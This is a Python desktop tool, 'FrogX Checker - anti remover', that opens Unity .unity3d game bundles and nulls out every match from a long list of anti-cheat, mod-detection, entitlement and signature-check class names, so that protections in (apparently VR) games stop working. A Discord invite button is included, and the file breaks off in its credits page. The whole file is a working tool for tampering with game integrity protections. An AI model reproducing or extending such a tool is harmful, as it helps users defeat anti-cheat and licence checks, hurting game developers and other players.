import tkinter as tk
from tkinter import filedialog, messagebox, colorchooser
import threading
import os
import traceback
import sys
import webbrowser

# ── Force the window to stay open even on error ───────────────────────────
def show_error_and_keep_open(exc_type, exc_value, exc_traceback):
    error_msg = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))
    print(error_msg)
    try:
        messagebox.showerror("Error - Window will stay open",
                             f"Something went wrong:\n\n{exc_value}\n\n"
                             "Full error was printed to the console.")
    except:
        pass
    try:
        root.mainloop()
    except:
        input("Press Enter to close...")
sys.excepthook = show_error_and_keep_open

ANTI_CHEAT_KEYWORDS = [
    b"AntiQuiter", b"XervasAntiCheat", b"AntiBypasser", b"AntiLib", b"AntiLemonLoader", b"AntiLibAndLemon",
    b"FieldCheatDetector", b"ADetector'1", b"PersistentSingleton1",
    b"Hidemyshitsonofabitch", b"Luc2dsprotectedanti", b"XrToolkitCs",
    b"Entitlementcheck", b"AstreiodsGameManager", b"BanOnStart",
    b"CheckIfInUnity", b"DeleteData", b"ZzYyXx", b"QuestLink",
    b"HorrorAi", b"KSHRAnti", b"SaveManager", b"TeleportToBan",
    b"VersionChecker", b"KeyPadEnter", b"AppEntitlementCheck",
    b"SignatureCheck", b"ProtectedUIInt32", b"AsteroidSpawner",
    b"ProtectedInt16", b"Bullet", b"ProtectedVector4", b"ProtectedFloat",
    b"ProtectedQuaternionPref", b"ProtectedVector3Int",
    b"ProtectedVector2Pref", b"ProtectedString", b"Asteroid",
    b"CheatingDetectionStatus", b"AntiCheatMonitor", b"ProtectedUInt64",
    b"QuestSentailProtect", b"DllChecker", b"assembliesToCheck",
    b"AstreiodsGame", b"AntiCheatManager", b"DllSigmaThing",
    b"WallHackDetector", b"SpeedHackDetector", b"ModTool", b"GOOBEREER",
    b"GlitchMonke", b"IgottaremanethisitwasmadebyK_S_H_R",
    b"Kidsthesedays", b"veryfyyey", b"ApkChecker", b"Antimodders",
    b"Code.Stages.Anticheats", b"AppDeeplinkUI", b"ChangeCosmetic",
    b"coinsScripts", b"PublicZone", b"SampleUI",
    b"LoginHandle.IsClientLoggedIn", b"ConntrastStretch",
    b"CollisionSounds", b"Donut", b"WifiCheck", b"PlayerMovement01",
    b"HydrasPrivAntiCheat", b"imposter", b"AntiCheat", b"Funnymods",
    b"BloxianAnti", b"KokoAntiSkid", b"checkere", b"particallagreducer",
    b"timmyfixer", b"antidll", b"anti-dll", b"anti-hack", b"anti-cheat",
    b"anticheat", b"ModsFolderChecker", b"FolderVerifer",
    b"LemonFolderChecker", b"Melonloaderchecker", b"AntiCheats",
    b"Sgima", b"bustanut", b"coke", b"yummy", b"yummymelons",
    b"yummylemons", b"AntiModFolders", b"BadBilly", b"DisableOnEnable",
    b"QuitGame", b"DisableOnStart", b"AntiCheat2byXler",
    b"AntiCheatByXler", b"AntiModders", b"QuitOnCollision",
    b"DisableOnJoin", b"getBanReason", b"BanManager",
    b"SnowAntiRuntime", b"noscrippyforyou", b"UnitysAntiCheat",
    b"DestroyBOTrigger", b"PastebinLoader", b"byeeeeeeeeee",
    b"handscantbeextremelyfarapart", b"EnableObjectAfterDelay",
    b"PhotonTrigger", b"NetworkRig", b"NoLemonScript", b"BasilsAuth",
    b"sigma", b"GorillaQuitBox", b"spoopy",
    b"DiscordWebhookTrigger", b"VoidGuard", b"SuspiciousBehaviourChecker",
    b"owner", b"DeviceCheck", b"LevelManager", b"GorillaManagerV2",
    b"AntiUABEA", b"FroggysAntiSkid", b"MeshEnable", b"tpiffail",
    b"chilloutitsjustagamelol", b"VentOpenPro", b"CumDoorButtonD",
    b"SigmaFPS", b"SharksAndMinnowsManager", b"BoxMove2", b"lnit",
    b"ResetToStart", b"FPSDisplayFR", b"FunMonkeyGONE", b"JumpScareN",
    b"SHRplayfabauth1", b"CheckSkuOwnership", b"SHRplayfabauth",
    b"objectsarecool", b"ownsmodcosmetics", b"AntiModder",
    b"KickIfBanned", b"QuestScript", b"kickp", b"rizz", b"DLLChecker",
    b"MeNoLoaderchecker", b"AntiKickTest", b"KickProtection",
    b"NoNameDetector", b"AIBooster", b"StoreMesh",
    b"hidemyshitsonofabitch", b"gameobj", b"gaymonster", b"moveon",
    b"NewBehaviourScript", b"CokesAnticheat", b"youcantgetwomenever",
    b"youbroketherules", b"IsCorrect", b"yabadabadooo", b"workrrr",
    b"WHYYYYY", b"WAAAAAA", b"Treeheehehe", b"byebye", b"byebyeee",
    b"rotatething", b"settingsyoo", b"thinghehe", b"treeman",
    b"heydonthaveeverything", b"whyareyoufrozen", b"nametag", b"Checkn",
    b"blablabla", b"EditorOnlyStuff", b"somethingtolurethem",
    b"NameDetector", b"ModFolderChecker", b"NoPublic", b"NoPublic125",
    b"sigcheck", b"Questlink", b"Modders", b"Modder", b"sigchecker",
    b"Signature Check", b"MelonLoader", b"uwumod", b"amongus",
    b"OculusByteCheck", b"HydrasBasicAntiCheat", b"ByteCheck",
    b"PlayFabEconomyModel", b"TruffleManager3000", b"GameObjectShopManager",
    b"ShopManger", b"ShopManager",
    b"EasyAntiCheat", b"BattlEye",
    b"FairFight", b"PunkBuster", b"XIGNCODE3", b"nProtect GameGuard",
    b"Ricochet", b"Tencent Protect",
    b"LeaderboardManager", b"FurnacesAntiCheat", b"TheGriddy",
    b"SnowballSpammy", b"QuestSentinelProtect", b"QuestScriptFinder", b"ModsFolderCheckerV2",
    b"joshhsFreeAnticheat", b"PlayfabManager1", b"HydrasUltimateAntiCheat", b"GorillaNot",
    b"KarmasMidAC", b"LoadObjectsOnStart", b"UnloadObjectsOnStart", b"FoxysAttributeTest",
    b"FoxysReallyGoodAnticheat", b"UabeMethod", b"SuspiciousBehaviourDetector", b"GetBanReasonFromSave",
    b"IsModded", b"FolderCheck", b"AnticheatHider", b"OPAnticheat",
    b"CoolThing", b"LemonLoaderChecker", b"ModderChecker", b"veryyfyyey",
    b"OpenLink",
    b"YesYesYesSomething", b"ToooMMMM", b"PlayerTrackerV2", b"PlayerCounter",
    b"NetworkLog", b"Update", b"triggeranticheat", b"senddiscordwebhook",
    b"OnDisable", b"Awake", b"PlayfabAndroidSdkLoader", b"VS2022",
    b"GCSVersionCheckerCloudScript", b"StrictName", b"GetPatchedHWID",
    b"boomhhe", b"bybyeee",
    b"ihptg", b"ihptgb", b"dfgdfhgfdjhgdfhjyghfgh", b"dfgfgdh",
    b"disableme", b"fdfdgdgghgdfh", b"fdghgdjyghkfju", b"fgdfg",
    b"forbumbum", b"gfhdgfdhhfghjydghj", b"glich",
    b"hahanomoree", b"honosanta", b"ifoffline", b"imtheonlyone",
    b"jumpscare", b"jumpscaremonstermode", b"Jumpscaretriggerr", b"jumpthing",
    b"jumpyee", b"killthisobjectnow", b"kill", b"minime",
    b"missletoeye", b"playgameye", b"upatething", b"verryfyyey",
    b"weeeee", b"wewoo", b"whyme", b"workgpt",
    b"RetardedScriptByLemon", b"AntiCheatCombobySkelo", b"BadNameChecker", b"WarnIfPFCosOn",
    b"PlayfabPatcherFix", b"cokesbasicantigivemefuckingcredits", b"FreeAnticheat", b"FPSCap",
    b"TrollModders", b"playfabchecker", b"ACHIDER", b"SolarAntiCheat",
    b"SolarAntiCheatFree", b"AntiTagCheat", b"EternalTag", b"PhotonDisableForVersionChecker",
    b"PhotonAuth", b"Hydraspriv", b"AntiCheatMemoryscan",
    b"Antipcvr", b"GlitchModdingToolAnti", b"RealadvanceAntiCheat", b"AntiCheatAdvanced",
    b"Keosteleport", b"keosglass", b"keosAiFortuneTeller", b"AntiPatcher",
    b"LamesAnti", b"Playfablogics", b"QualityHandlerV1",
    b"PlayfabAuthLogic", b"Antivpn", b"playfabantithing", b"AntiPull",
    b"Antispam", b"verifydevice", b"betterauth", b"AntiCheatMadeByIres",
    b"anticheatcloudscriptthing", b"detect", b"Detectable", b"ggfsfdsfdsffsd",
    b"Cheaters", b"Mods", b"Softaim", b"aimbot",
    b"anti", b"obfucationkiller", b"espdetecter",
    b"checkforcheats", b"byteus",
    b"PeopleWhoCallThemselvesHackersWhenAllTheyDoIsUseOpenSourceGitHubCode", b"AYVbHuVPWRd5KbDmwXhNXJ3oVZCgrUFbEn", b"JetixSexyCheat", b"Manager2",
    b"PlayFabWrapper", b"oksorryyeahilljustuhleave", b"NAUGHTYBOY", b"QuestLinkBase",
    b"BasicVersionChecker", b"PlayFabInventoryChecker", b"TpIfOutOfBounds", b"GorillaGyatt",
    b"HideMyStuffYou", b"FindPlayer", b"YourDead", b"IFoundYou",
    b"AntiCheatTool", b"AntiJoystick", b"HydrasAntiCheat", b"DelonLoader",
    b"QuestPatcher", b"MelonMod", b"ModderX", b"MonkeMod",
    b"KeosAntiAileas", b"AntiModification", b"CheatDetection", b"HackPrevention",
    b"SecurityCheck", b"IntegrityVerifier", b"GameProtection", b"AntiTamper",
    b"CodeIntegrity", b"ProcessMonitor", b"FileIntegrity", b"MemoryProtection",
    b"AntiDebug", b"AntiReverse", b"PackerDetection", b"HookDetector",
    b"RuntimeProtection", b"AntiEmulation", b"VirtualizationCheck", b"SandboxDetection",
    b"AntiVM", b"HardwareVerification", b"FingerprintCheck", b"BehaviorAnalysis",
    b"AnomalyDetection", b"PatternRecognition", b"StatisticalAnalysis", b"MachineLearningDetector",
    b"NeuralNetworkChecker", b"AIBasedDetection", b"CloudBasedVerification", b"ServerSideValidation",
    b"RemoteAuthentication", b"TokenVerification", b"CertificateCheck", b"LicenseValidation",
    b"SubscriptionVerifier", b"PermissionChecker", b"AccessControlList", b"RoleBasedSecurity",
    b"PrivilegeEscalation", b"UserBehaviorMonitor", b"SessionTracker", b"ActivityLogger",
    b"AuditTrail", b"ForensicAnalyzer", b"EvidenceCollector", b"IncidentResponse",
    b"ThreatIntelligence", b"RiskAssessment", b"VulnerabilityScanner", b"PenetrationTester",
    b"SecurityAuditor", b"ComplianceChecker", b"RegulationEnforcer", b"PolicyValidator",
    b"StandardsVerifier", b"EncryptionChecker", b"CryptographicValidator", b"HashVerifier",
    b"SignatureValidator", b"CertificateAuthority", b"PublicKeyInfrastructure", b"TrustChain",
    b"RevocationChecker", b"TimestampValidator", b"NonceGenerator", b"RandomnessVerifier",
    b"EntropyChecker", b"SecureRandom", b"CryptographicallySecure", b"KeyDerivation",
    b"PasswordHash", b"SaltGenerator", b"PepperValidator", b"BiometricVerifier",
    b"MultifactorAuth", b"TwoFactorAuthentication", b"OneTimePassword", b"TimeBasedOTP",
    b"HMACBasedOTP", b"AuthenticatorApp", b"SecurityToken", b"SmartCard",
    b"HardwareSecurityModule", b"TrustedPlatformModule", b"SecureEnclave", b"KeyStore",
    b"CertificateStore", b"CredentialManager", b"PasswordManager", b"SecretManagement",
    b"KeyRotation", b"CertificateRotation", b"TokenRefresh", b"SessionManagement",
    b"LoginTracker", b"LogoutHandler", b"IdleTimeout", b"SessionExpiry",
    b"InactivityDetector", b"ConcurrentSessionLimit", b"DeviceLimit", b"LocationVerifier",
    b"GeoFencing", b"IPWhitelisting", b"IPBlacklisting", b"NetworkSegmentation",
    b"TrafficAnalyzer", b"PacketInspector", b"ProtocolAnalyzer", b"FirewallRules",
    b"IntrusionDetection", b"IntrusionPrevention", b"DDoSProtection", b"RateLimiter",
    b"ThrottleController", b"BandwidthMonitor", b"QualityOfService", b"LoadBalancer",
    b"FailoverMechanism", b"DisasterRecovery", b"BackupValidator", b"RestoreVerifier",
    b"DataIntegrity", b"ChecksumValidator", b"HashComparison", b"DigitalSignature",
    b"MessageAuthentication", b"DataAuthentication", b"ContentVerification", b"FileVerification",
    b"ApplicationSigning", b"CodeSigning", b"BinaryValidation", b"ExecutableVerification",
    b"LibraryChecker", b"DependencyValidator", b"VersionControl", b"UpdateVerifier",
    b"PatchValidator", b"HotfixChecker", b"VulnerabilityFix", b"ExploitMitigation",
    b"ZeroDayProtection", b"AdvancedThreatProtection", b"NextGenFirewall", b"EndpointProtection",
    b"AntiMalware", b"AntiVirus", b"AntiSpyware", b"AntiRootkit",
    b"AntiKeylogger", b"AntiScreenCapture", b"AntiRecording", b"AntiScreenSharing",
    b"PrivacyProtection", b"DataLossPrevention", b"InformationRightsManagement", b"DigitalRightsManagement",
    b"CopyProtection", b"PiracyPrevention", b"LicenseEnforcement", b"UsageTracking",
    b"MetricsCollector", b"TelemetryGatherer", b"AnalyticsEngine", b"ReportingModule",
    b"statuscooler", b"mangomonster", b"lilthingy", b"hawktuahboi",
    b"mountainsyeti", b"spystuff", b"MonsterStatusMain", b"NavMeshBakeHelper",
    b"ForceDeleteData", b"AntiCheatToolkit", b"CodeStage.AntiCheat", b"ObscuredPrefs",
    b"InjectionDetector", b"ActOnce", b"MemoryProtector", b"ObscuredFloat",
    b"ObscuredInt", b"ObscuredString", b"TimeCheatingDetector", b"WireframeDetector",
    b"Antikick", b"Command", b"GorillaVRRig", b"ZzXxYy",
    b"CustomC#checker", b"AnnoyModders", b"AntiGravity", b"AntiModTrigger",
    b"AntiNoclip", b"AntiPhoton", b"ArmLength", b"BasicNameObfs",
    b"MonkeySecurityManager", b"PhotonConnectionDetector", b"PhotonViewTutorial", b"sisumeisfreeanticheat",
    b"yummy1", b"yummymelons1", b"disable",
    b"force", b"gaymonster1", b"acthing", b"ChairsSkibidiAnticheatNester",
    b"CopyofPlayFabManager", b"EventThing", b"GcsWasdMovement",
    b"PlayFabManager2", b"Tier1-GameProtection-Eternity", b"EasyAnti-Cheat", b"Fangame-AC",
    b"GCS-Anti-Cheat", b"NxMdChecker", b"CheatDetectedView", b"Popcnt",
    b"Stalker", b"sisumeisboosteranti", b"s4gecustomauth", b"QuestTagBackends",
    b"MidAuth", b"HikersBRM(AD)", b"Obfuscatorv3.9.8", b"Obfuscator3.9.2",
    b"Obf+Anticheat", b"EUrObfuscator", b"SkiddedAhhUnObf", b"ErmWorstObfEver",
    b"UnObfOrSum", b"QuitCheat", b"NigeriaMods", b"FuckMod",
    b"Shitty", b"Nocutecat", b"anotheraxiom", b"ScaryBaboonProtectKJ1CloudScript",
    b"FloppasCloudScriptV1Protection", b"CloudScriptAnticheat", b"customtaggersCloudScript", b"Dre1merTagCloudscript",
    b"LuckTaggersCLOUDSCRIPTNEWEST", b"ProjectHasCloudscript", b"ProjectNuggetCloudScript", b"ChristmasTagCloudscript",
    b"fustiontaggerscloudscriptpulledbydepreso", b"Floppas_Clloudscript_V2_UNMODDABLE", b"Ethter+BeebytePAYED6",
    b"HikersAdvancedAnticheatModdingProtectionV1", b"BestPrivateAnticheatByCokeUNMODDABLE", b"anticheatProfile", b"pasta", b"drumBubbler",
    b"OpenURL", b"YorickLook", b"PhotonGuardianZeta", b"AccountLib", b"AntiCheatByIres", b"AntiCheatByTvhdeath_Fixed",
    b"AccountLib", b"ACHIDER", b"acthing", b"Anti", b"AntiCheat", b"AntiCheatByIres", b"AntiCheatByTvhdeath_Fixed", b"AntiCheatManager",
    b"AntiGameInfoPuller", b"AntiLemonLoad", b"AntiModders", b"AntiPhoton", b"AntiPlayFabSpammer", b"AntiUABEA", b"Anticheat_111", b"anotheraxiom",
    b"APKChecker", b"Awake", b"badbilly", b"BestPrivateAnticheatByCokeUNMODDABLE", b"BetterAntiCheat", b"bloxianAnti", b"bustanut", b"ByteCheck",
    b"CAI", b"ChairsSkibidiAnticheatNester", b"ChaunAntiCheat", b"ChaunAntiCheat2", b"ChaunAntiCheat3", b"cheatsanti", b"Checkn", b"CokesAntiCheat",
    b"coke", b"Command", b"DeviceCheck", b"disable", b"Dll", b"Donut", b"DRINKINGANTI", b"dsiable",
    b"fgdfg", b"force", b"FPSCap", b"gameobj", b"gaymonster", b"getfuckedmodders", b"GorillaInteractManager", b"GorillaManagerV2",
    b"GorillaVRRig", b"gorillagyatt", b"Hashac", b"hidemyshitsonofabitch", b"HikerVerChecker", b"HorrorAiANTI", b"horrorai", b"HydrasBasicAntiCheat",
    b"HydrasPaidFixedAnti", b"HydrasPaidFixedanti", b"imposter", b"ISuckMyselfOffLikeAlot", b"KSHRAnti", b"kill", b"LamesAnti", b"LemonCheck",
    b"LemonFolderChecker", b"LobbyTracker", b"Luckgoesawesome", b"Melonloaderchecker", b"Mods", b"Mods6", b"Mods7", b"ModsFolderChecker",
    b"ModVentManager", b"moveon", b"NewBehaviourScript1", b"NoLemonScript", b"NutBustV2", b"OpenLink", b"OpenURL", b"owner",
    b"oxgspersonalanticheat", b"patchedspeedboost", b"patchloadersmain", b"pasta", b"PhotonAuth", b"PhotonManager2", b"PixelAntiCheat", b"PlayfabHider",
    b"PlayerCounter", b"PolarsFreeAntiCheat", b"QuestLink", b"QuestScriptFinder", b"QuestTriggers", b"RandomAntiCheat", b"RateLimiter", b"sgima",
    b"sigma", b"sisumeisfreeanticheat", b"spoopy", b"tpifail", b"tpifoutofbounce", b"TrollModders", b"UnitysAntiCheat", b"Update",
    b"URL", b"VerCheckthing", b"WestonsAntiPlayfabSpam", b"XlerIsCool", b"XrToolkitCs", b"xx yy zz Anti", b"YesYesYesSomething", b"yesyes",
    b"YorickLook", b"yummy", b"yummylemons", b"yummymelons", b"ZedsAntiCheat",
    b"BullyBadUsers", b"PlayfabBanHandle", b"Bow", b"kick", b"HydrasBasicAntiCheat", b"Imposter", b"GetBanReason",
    b"ProtectedUIInt32", b"ProtectedInt16", b"ProtectedVector4", b"ProtectedFloat", b"ProtectedQuaternionPref",
    b"ProtectedVector3Int", b"ProtectedVector2Pref", b"ProtectedString", b"ProtectedUInt64", b"AIBooster",
    b"TURN", b"treehe", b"spin", b"pain", b"yeye", b"DLLChecker", b"ModsFolderChecker",
]

# ── Colors ────────────────────────────────────────────────────────────────
BG_PRIMARY = "#08120A"
BG_SECONDARY = "#0D1C10"
BG_TERTIARY = "#16331B"
ACCENT_PRIMARY = "#39FF88"
ACCENT_SECONDARY = "#21C45A"
ACCENT_LIGHT = "#8CFFB7"
TEXT_SECONDARY = "#58C77B"
OK_COL = "#5DFF89"
ERR_COL = "#FF5F5F"
WARN_COL = "#FFE35A"

# ── Draggable window ──────────────────────────────────────────────────────
class DraggableWindow(tk.Tk):
    def __init__(self):
        super().__init__()
        self.overrideredirect(True)
        self.attributes('-alpha', 0.95)
        self._dx = self._dy = 0
    def create_title_bar(self, title_text="Menu"):
        bar = tk.Frame(self, bg=BG_SECONDARY, height=30)
        bar.pack(fill=tk.X, side=tk.TOP)
        bar.pack_propagate(False)
        lbl = tk.Label(bar, text=title_text, bg=BG_SECONDARY, fg=ACCENT_PRIMARY,
                       font=("Courier New", 10, "bold"))
        lbl.pack(side=tk.LEFT, padx=10, pady=5)
        tk.Button(bar, text="✕", bg=BG_SECONDARY, fg=ACCENT_SECONDARY,
                  font=("Arial", 12, "bold"), command=self.destroy, bd=0,
                  padx=8, pady=2, activebackground=BG_SECONDARY,
                  activeforeground=ACCENT_PRIMARY, highlightthickness=0,
                  cursor="hand2").pack(side=tk.RIGHT, padx=5, pady=2)
        for w in (bar, lbl):
            w.bind("<Button-1>", self._press)
            w.bind("<B1-Motion>", self._drag)
        return lbl
    def _press(self, e):
        self._dx = e.x_root - self.winfo_x()
        self._dy = e.y_root - self.winfo_y()
    def _drag(self, e):
        self.geometry(f"+{e.x_root-self._dx}+{e.y_root-self._dy}")

# ── HoverButton ───────────────────────────────────────────────────────────
class HoverButton(tk.Button):
    def __init__(self, parent, **kw):
        super().__init__(parent, **kw)
        self.dbg = kw.get('bg', BG_TERTIARY)
        self.dfg = kw.get('fg', ACCENT_PRIMARY)
        self.hbg = kw.get('activebackground', ACCENT_PRIMARY)
        self.hfg = kw.get('activeforeground', BG_PRIMARY)
        self.bind("<Enter>", lambda e: self.config(bg=self.hbg, fg=self.hfg))
        self.bind("<Leave>", lambda e: self.config(bg=self.dbg, fg=self.dfg))
    def update_colors(self, new_fg):
        self.dfg = new_fg
        self.hbg = new_fg
        self.config(fg=new_fg, activebackground=new_fg)

# ── Rainbow Discord Button ────────────────────────────────────────────────
class RainbowButton(tk.Button):
    def __init__(self, parent, **kw):
        super().__init__(parent, **kw)
        self.colors = ["#FF0040", "#FF7A00", "#FFD100", "#39FF14", "#00F5FF", "#007BFF", "#C000FF"]
        self.index = 0
        self.after(80, self._flash)

    def _flash(self):
        color = self.colors[self.index]
        self.config(fg=color, activebackground=color, activeforeground=BG_PRIMARY)
        self.index = (self.index + 1) % len(self.colors)
        self.after(90, self._flash)

# ── Anti-remover functions ────────────────────────────────────────────────
filepath = None
modified_data = None
removal_log = []

def load_file():
    global filepath, modified_data, removal_log
    path = filedialog.askopenfilename(filetypes=[("Unity3D Files", "*.unity3d")])
    if path:
        filepath = path
        modified_data = None
        removal_log = []
        status_label.config(text=f"✓ Loaded: {os.path.basename(path)}", fg=ACCENT_LIGHT)
        log_output.delete("1.0", tk.END)
        log_output.insert(tk.END, f"> File loaded: {os.path.basename(path)}\n")

def remove_antis():
    global modified_data, removal_log
    if not filepath or not os.path.exists(filepath):
        messagebox.showerror("Error", "No valid file loaded.")
        return
    def process():
        global modified_data, removal_log
        status_label.config(text="Processing...", fg=ACCENT_PRIMARY)
        log_output.delete("1.0", tk.END)
        log_output.tag_configure("hit", foreground=OK_COL)
        log_output.tag_configure("miss", foreground="#3a2555")
        log_output.tag_configure("hdr", foreground=ACCENT_PRIMARY)
        log_output.insert(tk.END, "> Scanning file...\n\n", "hdr")
        removal_log = []
        with open(filepath, "rb") as f:
            data = bytearray(f.read())
        total = 0
        for kw in ANTI_CHEAT_KEYWORDS:
            name = kw.decode(errors="ignore")
            c = data.count(kw)
            if c:
                total += c
                removal_log.append(f"{name} (x{c})")
                while kw in data:
                    i = data.find(kw)
                    data[i:i+len(kw)] = b"\x00" * len(kw)
                log_output.insert(tk.END, f" + {name} (x{c})\n", "hit")
            else:
                log_output.insert(tk.END, f" . {name}\n", "miss")
            log_output.see(tk.END)
        modified_data = bytes(data)
        status_label.config(text=f"Done! Removed {total} instances", fg=ACCENT_LIGHT)
        log_output.insert(tk.END, "\n" + "-"*60 + "\n", "hdr")
        log_output.insert(tk.END, f"> removed: {total} | unique hits: {len(removal_log)}\n", "hdr")
        if not removal_log:
            log_output.insert(tk.END, " [No anticheat detected]\n", "miss")
        log_output.see(tk.END)
    threading.Thread(target=process, daemon=True).start()

def save_file():
    if modified_data is None:
        messagebox.showerror("Error", "Run scan first.")
        return
    p = filedialog.asksaveasfilename(defaultextension=".unity3d",
                                     initialfile="data.unity3d",
                                     filetypes=[("Unity3D Files", "*.unity3d")])
    if p:
        with open(p, "wb") as f:
            f.write(modified_data)
        status_label.config(text=f"✓ Saved: {os.path.basename(p)}", fg=ACCENT_LIGHT)
        log_output.insert(tk.END, f"\n> Saved: {os.path.basename(p)}\n")

def view_logs():
    log_output.delete("1.0", tk.END)
    if not removal_log:
        log_output.insert(tk.END, "> No logs — load and scan first\n")
        return
    log_output.insert(tk.END, f"> REMOVAL LOG ({len(removal_log)} items)\n" + "─"*60 + "\n\n")
    for item in removal_log:
        log_output.insert(tk.END, f" ◆ {item}\n")

def open_Join_discord():
    webbrowser.open("https://discord.gg/XTJqKxrxR")

# ── Theme color changer ───────────────────────────────────────────────────
def apply_theme_color(new_color):
    global ACCENT_PRIMARY, ACCENT_SECONDARY, ACCENT_LIGHT, TEXT_SECONDARY
    ACCENT_PRIMARY = new_color
    ACCENT_SECONDARY = new_color
    ACCENT_LIGHT = new_color
    TEXT_SECONDARY = new_color
    for w in theme_widgets:
        try:
            if isinstance(w, HoverButton):
                w.update_colors(new_color)
            else:
                w.config(fg=new_color)
        except:
            pass
    try:
        accent_line.config(bg=new_color)
        log_output.config(fg=new_color, insertbackground=new_color)
        methods_text.config(fg=new_color, insertbackground=new_color)
        status_label.config(fg=new_color)
        current_color_label.config(fg=new_color, text=f"Current: {new_color}")
        title_bar_label.config(fg=new_color)
    except:
        pass

def open_color_picker():
    color = colorchooser.askcolor(title="Choose Theme Text Color", color=ACCENT_PRIMARY)
    if color and color[1]:
        apply_theme_color(color[1])

# ── Page switching ────────────────────────────────────────────────────────
def show_main():
    page_credits.pack_forget()
    page_methods.pack_forget()
    page_settings.pack_forget()
    page_main.pack(fill="both", expand=True)

def show_credits():
    page_main.pack_forget()
    page_methods.pack_forget()
    page_settings.pack_forget()
    page_credits.pack(fill="both", expand=True)

def show_methods():
    page_main.pack_forget()
    page_credits.pack_forget()
    page_settings.pack_forget()
    page_methods.pack(fill="both", expand=True)

def show_settings():
    page_main.pack_forget()
    page_credits.pack_forget()
    page_methods.pack_forget()
    page_settings.pack(fill="both", expand=True)

# ── Build the window ──────────────────────────────────────────────────────
try:
    root = DraggableWindow()
    root.geometry("720x820+100+100")
    root.configure(bg=BG_PRIMARY)
    root.resizable(False, False)

    root.attributes('-topmost', True)
    root.update()
    root.attributes('-topmost', False)
    root.lift()
    root.focus_force()

    title_bar_label = root.create_title_bar("FrogX Checker - anti remover")
    accent_line = tk.Frame(root, bg=ACCENT_PRIMARY, height=3)
    accent_line.pack(fill="x", side="top")

    hdr = tk.Frame(root, bg=BG_SECONDARY, height=70)
    hdr.pack(fill="x")
    hdr.pack_propagate(False)

    tk.Label(hdr, text="FrogX Checker", fg=ACCENT_PRIMARY, bg=BG_SECONDARY,
             font=("Courier New", 32, "bold")).pack(pady=(15, 5))
    tk.Label(hdr, text="anti remover", fg=ACCENT_SECONDARY, bg=BG_SECONDARY,
             font=("Courier New", 10, "italic")).pack(pady=(0, 5))
    tk.Label(hdr, text="v1.0", fg=TEXT_SECONDARY, bg=BG_SECONDARY,
             font=("Courier New", 8)).pack()

    settings_btn = HoverButton(hdr, text="⚙ SETTINGS", command=show_settings,
                               bg=BG_TERTIARY, fg=ACCENT_PRIMARY,
                               font=("Courier New", 9, "bold"),
                               relief="flat", bd=0, padx=10, pady=4,
                               cursor="hand2",
                               activebackground=ACCENT_PRIMARY, activeforeground=BG_PRIMARY,
                               highlightthickness=0)
    settings_btn.place(relx=1.0, rely=0.5, anchor="e", x=-12)
    theme_widgets = [settings_btn]

    # ── Main page (EXACT same layout + Discord button) ────────────────────
    page_main = tk.Frame(root, bg=BG_PRIMARY)

    bs = dict(bg=BG_TERTIARY, fg=ACCENT_PRIMARY, font=("Courier New", 9, "bold"),
              relief="flat", bd=0, pady=8, cursor="hand2",
              activebackground=ACCENT_PRIMARY, activeforeground=BG_PRIMARY,
              highlightthickness=0)

    cf = tk.Frame(page_main, bg=BG_PRIMARY)
    cf.pack(fill="x", padx=25, pady=12)

    btn1 = HoverButton(cf, text="LOAD UNITY3D", command=load_file, **bs)
    btn1.pack(pady=4, fill="x")
    btn2 = HoverButton(cf, text="REMOVE ANTI", command=remove_antis, **bs)
    btn2.pack(pady=4, fill="x")
    btn3 = HoverButton(cf, text="SAVE FILE", command=save_file, **bs)
    btn3.pack(pady=4, fill="x")
    btn4 = HoverButton(cf, text="VIEW LOGS", command=view_logs, **bs)
    btn4.pack(pady=4, fill="x")
    btn5 = HoverButton(cf, text="METHODS", command=show_methods, **bs)
    btn5.pack(pady=4, fill="x")
    btn6 = HoverButton(cf, text="CREDITS", command=show_credits, **bs)
    btn6.pack(pady=4, fill="x")

    # Rainbow Discord button (added here)
    btn_discord = RainbowButton(cf, text="★ JOIN DISCORD ★",
                                command=open_Join_discord,
                                bg=BG_TERTIARY, fg="#FF0040",
                                font=("Courier New", 10, "bold"),
                                relief="flat", bd=0, pady=10,
                                cursor="hand2", highlightthickness=0)
    btn_discord.pack(pady=(10, 4), fill="x")

    theme_widgets.extend([btn1, btn2, btn3, btn4, btn5, btn6])

    sf = tk.Frame(page_main, bg=BG_PRIMARY)
    sf.pack(fill="x", padx=25, pady=(8, 10))
    tk.Label(sf, text="●", fg=TEXT_SECONDARY, bg=BG_PRIMARY, font=("Arial", 8)).pack(side="left", padx=(0, 8))
    status_label = tk.Label(sf, text="waiting for file...", fg=TEXT_SECONDARY,
                            bg=BG_PRIMARY, font=("Courier New", 9))
    status_label.pack(side="left")

    tk.Frame(page_main, bg=BG_TERTIARY, height=1).pack(fill="x", padx=20)

    lf = tk.Frame(page_main, bg=BG_PRIMARY)
    lf.pack(padx=20, pady=10, fill="both", expand=True)
    tk.Label(lf, text="[ output ]", fg=ACCENT_SECONDARY, bg=BG_PRIMARY,
             font=("Courier New", 9, "bold")).pack(anchor="w", pady=(0, 6))
    lc = tk.Frame(lf, bg=BG_TERTIARY, highlightthickness=0)
    lc.pack(fill="both", expand=True)
    sb = tk.Scrollbar(lc, bg=BG_TERTIARY, troughcolor=BG_PRIMARY,
                      activebackground=ACCENT_PRIMARY, width=8)
    sb.pack(side="right", fill="y")
    log_output = tk.Text(lc, height=16, bg=BG_SECONDARY, fg=ACCENT_PRIMARY,
                         font=("Courier New", 8), relief="flat", bd=0,
                         insertbackground=ACCENT_PRIMARY, yscrollcommand=sb.set,
                         padx=12, pady=10)
    log_output.pack(side="left", fill="both", expand=True)
    sb.config(command=log_output.yview)

    # ── Credits page ──────────────────────────────────────────────────────
    page_credits = tk.Frame(root, bg=BG_PRIMARY)
    credits_frame = tk.Frame(page_credits, bg=BG_PRIMARY)
    credits_frame.pack(expand=True)
    tk.Label(credits_frame, text="CREDITS", fg=ACCENT_PRIMARY, bg=BG_PRIMARY,
             font=("Courier New", 28, "bold")).pack(pady=(40, 30))
    tk.Label(credits_frame, text="Cryptic", fg=ACCENT_LIGHT, bg=BG_PRIMARY,
             font=("Courier New", 16, "bold")).pack(pady=(10, 4))
    tk.Label(credits_frame, text="made the actual thing and added most the antis",
             fg=TEXT_SECONDARY, bg=BG_PRIMARY, font=("Courier New", 11)).pack(pady=(0, 20))
    tk.Label(credits_frame, text="Remi", fg=ACCENT_LIGHT, bg=BG_PRIMARY,
             font=("Courier New", 16, "bold")).pack(pady=(10, 4))
    tk.Label(credits_frame, text="Added a lot of the antis and change some other stuff",
